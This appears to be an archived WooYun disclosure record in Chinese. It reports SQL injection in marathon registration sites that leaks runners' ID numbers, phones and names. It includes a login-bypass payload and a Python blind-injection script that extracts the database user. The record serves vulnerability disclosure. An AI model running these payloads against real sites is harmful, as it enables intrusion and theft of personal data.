{"id": 75180, "wybug_id": "wooyun-2016-0168339", "wybug_title": "多个马拉松网站存在SQL注入，泄露用户信息（附验证脚本）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2016-01-11 22:34", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 泄露用户的身份证、电话等信息 详细说明：  http://**.**.**.**\n\n赛事不一样 数据来源不一样这里以最新的无锡为例\n\n输入a'or'1'='1\n\n获取到用户的身份证号、电话和姓名\n\n\n\n\n\n\n\n\n\n\n\n长度为18看第一位certificate_id=220*******2231' and ascii(substring(user(),1,1))=114 and 'a'='a&race=28\n\n   漏洞证明：  使用脚本\n#encoding=utf-8import httplibimport stringimport sysimport randomimport urllibheaders = {'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0',}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print 'Start to retrive user:'user= ''for i in range(1, 19):    for payload in payloads:                       s = \"certificate_id=220***********231' and ascii(substring(user(),%s,1))=%s and 'a'='a&race=28\"% (i, ord(payload))            conn = httplib.HTTPConnection('**.**.**.**', timeout=150)            conn.request(method='POST',                         url='/race/check/race/28',                         body=s,                         headers=headers)            resp = conn.getresponse()            html_doc = resp.read()            conn.close()            #print html_doc            print '.',                   if html_doc.count('220***********231') > 0:                user += payload                print '\\n\\n[in progress]', user,                breakprint '\\n\\n[Done]  user is %s' % user\n\n\n猜测certificate_id为表中字段使用\na' and or certificate_id = 3204********0533 and 'a'='a\n\n\n还有\nhttp://**.**.**.**/race/checkhttp://**.**.**.**/race/check\n\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2016-01-15 15:35 厂商回复： CNVD未复现所述情况,已经转由CNCERT下发给江苏分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}